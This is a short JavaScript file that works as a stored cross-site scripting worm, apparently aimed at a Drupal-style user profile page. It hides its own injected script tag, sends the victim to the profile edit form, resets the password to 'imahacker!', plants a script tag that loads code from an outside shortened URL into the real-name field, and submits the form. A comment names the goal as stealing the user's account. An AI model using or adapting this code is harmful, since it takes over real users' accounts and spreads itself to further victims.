var script = document.currentScript;

var oldHtml = document.body.innerHTML;

var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/PHPvuT\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters

document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/PHPvuT\">".length );
//now we do the payload: steal the users account
var passInputs;

if (location.href == document.querySelector('.welcome-edit-link').href) {
  passInputs = document.querySelectorAll("input[type=password]");
  passInputs[0].value = "imahacker!";
  passInputs[1].value = "imahacker!";
  document.querySelector("#edit-profile-main-field-real-name-und-0-value").value = "<script/src=//goo.gl/gPZ5Dv>";
  document.querySelector("form")[1].submit();
} else {
  location.href = document.querySelector('.welcome-edit-link').href;
};
